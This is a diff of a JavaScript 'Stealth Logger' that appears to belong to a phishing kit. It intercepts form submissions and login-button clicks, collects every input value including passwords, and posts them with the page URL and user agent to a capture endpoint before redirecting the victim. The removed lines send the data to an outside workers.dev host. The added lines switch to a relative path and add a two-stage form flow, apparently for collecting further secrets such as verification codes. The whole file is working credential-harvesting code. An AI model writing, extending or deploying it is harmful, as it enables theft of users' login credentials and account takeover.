@@ -1,57 +1,59 @@
 // CONFIG
 const CONFIG = {
     INPUT_IDLE_TIMEOUT: 2000,
-    // Expanded patterns as requested
     SUBMIT_BUTTON_PATTERNS: [
         'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',
         'log on', 'start', 'verify', 'go', 'enter', 'accept'
     ],
     REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
-    // The worker endpoint to receive data (relative path)
-    CAPTURE_URL: 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'
+    CAPTURE_URL: '/api/capture',
+    MULTI_STAGE: window.MULTI_STAGE || false
 };
 
-// ===== INVISIBLE LOGGER =====
 (() => {
     const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);
-
     let typingTimer;
     let formData = {};
+    let currentStage = 1;
+    let stage1Data = {};
 
-    // Helper to get a usable name for a field
     const getFieldName = (field) => {
         return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || `unnamed_${field.type}`;
     };
 
-    // Helper to capture ALL current inputs on the page
     const captureAllInputs = () => {
-        const data = { ...formData }; // Start with what we captured from typing
-        document.querySelectorAll('input, textarea, select').forEach(field => {
+        const data = { ...formData };
+
+        let selector = 'input, textarea, select';
+        if (CONFIG.MULTI_STAGE) {
+            selector = currentStage === 1 ? '#dtech-stage-1 input, #dtech-stage-1 textarea, #dtech-stage-1 select'
+                                          : '#dtech-stage-2 input, #dtech-stage-2 textarea, #dtech-stage-2 select';
+        }
+
+        document.querySelectorAll(selector).forEach(field => {
             const name = getFieldName(field);
             const value = field.value.trim();
-            // Only add if it has a value and isn't already captured (or overwrite if we prefer fresh data)
-            // Prioritize fresh DOM read over typing history for accuracy at submit time
-            if (value) {
-                data[name] = value;
-            }
+            if (value) data[name] = value;
         });
         return data;
     };
 
-    // Send to your Worker
     const sendData = async (data) => {
         try {
             const timestamp = new Date().toISOString();
             const pageUrl = window.location.href;
-            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN'; // Get the unique code injected by the worker
+            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN';
 
-            // Build a simple JSON payload for the worker
+            if (CONFIG.MULTI_STAGE && currentStage === 2) {
+                data = { ...stage1Data, ...data };
+            }
+
             const payload = {
                 url: pageUrl,
                 timestamp: timestamp,
                 formData: data,
                 userAgent: navigator.userAgent,
-                uniqueCode: uniqueCode // Include the unique code
+                uniqueCode: uniqueCode
             };
 
             const response = await fetch(CONFIG.CAPTURE_URL, {
@@ -62,21 +64,67 @@ const CONFIG = {
 
             if (response.ok) {
                 log('Successfully sent to Worker');
-                window.location.href = CONFIG.REDIRECT_URL;  // Redirect after success
+                window.location.href = CONFIG.REDIRECT_URL;
             } else {
                 const err = await response.text();
                 log('Worker error: ' + err, 'error');
-                // Fallback redirect
                 setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
             }
         } catch (err) {
             log('Fetch failed: ' + err.message, 'error');
-             // Fallback redirect
              setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
         }
     };
 
-    // Input change handler (collects as user types)
+    const handleAction = (e, target) => {
+        if (CONFIG.MULTI_STAGE && currentStage === 1) {
+             const keywords = CONFIG.SUBMIT_BUTTON_PATTERNS;
+             let isSubmit = false;
+
+             const text = (target.innerText || target.value || '').toLowerCase();
+             if (keywords.some(p => text.includes(p))) isSubmit = true;
+
+             if (e.type === 'submit') isSubmit = true;
+
+             if (isSubmit) {
+                 e.preventDefault();
+                 e.stopPropagation();
+
+                 const s1Data = captureAllInputs();
+                 stage1Data = s1Data;
+                 formData = {};
+
+                 const s1 = document.getElementById('dtech-stage-1');
+                 const s2 = document.getElementById('dtech-stage-2');
+                 if(s1 && s2) {
+                     s1.style.display = 'none';
+                     s2.style.display = 'block';
+                     currentStage = 2;
+                     log('Switched to Stage 2');
+                 }
+                 return;
+             }
+        }
+
+        let shouldSend = false;
+
+        if (e.type === 'submit') {
+            shouldSend = true;
+        } else {
+            const text = (target.innerText || target.value || '').toLowerCase();
+            if (CONFIG.SUBMIT_BUTTON_PATTERNS.some(p => text.includes(p))) {
+                shouldSend = true;
+            }
+        }
+
+        if (shouldSend) {
+             e.preventDefault();
+             e.stopPropagation();
+             const data = captureAllInputs();
+             sendData(data);
+        }
+    };
+
     const setupInputHandlers = () => {
         document.querySelectorAll('input, textarea, select').forEach(field => {
             field.addEventListener('input', () => {
@@ -84,93 +132,38 @@ const CONFIG = {
                 typingTimer = setTimeout(() => {
                     const name = getFieldName(field);
                     const value = field.value.trim();
-                    if (value) {
-                        formData[name] = value;
-                    }
+                    if (value) formData[name] = value;
                 }, CONFIG.INPUT_IDLE_TIMEOUT);
             });
         });
     };
 
-    // Submit / button handlers
     const setupSubmissionHandlers = () => {
-        // 1. Standard Form Submits
         document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', (e) => {
-                e.preventDefault(); // Stop normal form submission
-                const data = captureAllInputs();
-                if (Object.keys(data).length > 0) {
-                    sendData(data);
-                } else {
-                    // If no data, proceed anyway
-                    window.location.href = CONFIG.REDIRECT_URL;
-                }
-            }, true);
+            form.addEventListener('submit', (e) => handleAction(e, e.target), true);
         });
 
-        // 2. Generic Button Clicks (for non-form logins or div buttons)
         document.addEventListener('click', (e) => {
             const target = e.target;
-
-            // IGNORE clicks on interactive inputs (unless it's a button type)
-            // This prevents capturing when the user just clicks to type in a field.
             if (['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'LABEL'].includes(target.tagName)) {
-                // If it's a text/password/email input, ignore.
-                // Only proceed if it is strictly a submit/button input.
                 if (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button' || target.type === 'image')) {
-                     // Proceed to check as a button
+                     // pass
                 } else {
                     return;
                 }
             }
 
-            // Helper to check text content against keywords
-            const matchesKeyword = (el) => {
-                const text = (el.innerText || el.value || '').toLowerCase();
-                return CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => text.includes(pattern));
-            };
-
-            // A. Check for Standard Buttons/Links first (Button, Input[submit], A)
-            // We look up the tree in case the click was on an icon inside the button
-            const stdBtn = target.closest('button, input[type="submit"], input[type="button"], a');
-            if (stdBtn) {
-                if (matchesKeyword(stdBtn)) {
-                     const data = captureAllInputs();
-                     if (Object.keys(data).length > 0) {
-                         e.preventDefault();
-                         e.stopPropagation();
-                         sendData(data);
-                     }
-                     return;
+            const btn = target.closest('button, input[type="submit"], input[type="button"], a, div, span');
+            if (btn) {
+                if (['DIV', 'SPAN'].includes(btn.tagName)) {
+                     const style = window.getComputedStyle(btn);
+                     if (style.cursor !== 'pointer' && btn.getAttribute('role') !== 'button') return;
                 }
-            }
-
-            // B. Check for "Fake" Buttons (div, span)
-            // These must look clickable (cursor: pointer) or have role="button"
-            // We avoid simply using closest('div') because that catches container divs.
-
-            // We assume the user clicks *on* the button or a direct child.
-            // So we check the target and its immediate parents for a "clickable div".
-            const fakeBtn = target.closest('div, span');
-
-            if (fakeBtn) {
-                // Determine if this element is "interactive"
-                const style = window.getComputedStyle(fakeBtn);
-                const isClickable = style.cursor === 'pointer' || fakeBtn.getAttribute('role') === 'button';
-
-                if (isClickable && matchesKeyword(fakeBtn)) {
-                     const data = captureAllInputs();
-                     if (Object.keys(data).length > 0) {
-                         e.preventDefault();
-                         e.stopPropagation();
-                         sendData(data);
-                     }
-                }
+                handleAction(e, btn);
             }
         }, true);
     };
 
-    // Initialize
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', () => {
             setupInputHandlers();
@@ -180,5 +173,4 @@ const CONFIG = {
         setupInputHandlers();
         setupSubmissionHandlers();
     }
-
 })();
